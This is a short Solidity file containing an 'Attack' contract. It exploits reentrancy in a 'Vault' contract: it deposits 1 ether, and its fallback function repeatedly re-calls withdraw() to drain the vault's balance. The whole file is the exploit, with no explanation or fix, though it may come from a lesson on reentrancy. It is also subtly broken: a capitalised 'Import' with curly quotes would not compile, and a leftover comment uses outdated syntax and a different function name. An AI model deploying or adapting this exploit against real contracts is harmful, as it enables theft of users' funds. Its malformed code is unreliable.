pragma solidity 0.8.11;
Import  “Vault.sol”;

contract Attack {
    Vault public vault;

    constructor(address _vaultAddress) {
        vault= Vault(_vaultAddress);
    }

    // Fallback is called when vault sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.deposit{value: 1 ether}();
//vault.depositFunds.value(1 ether)();
        vault.withdraw();
    }


}
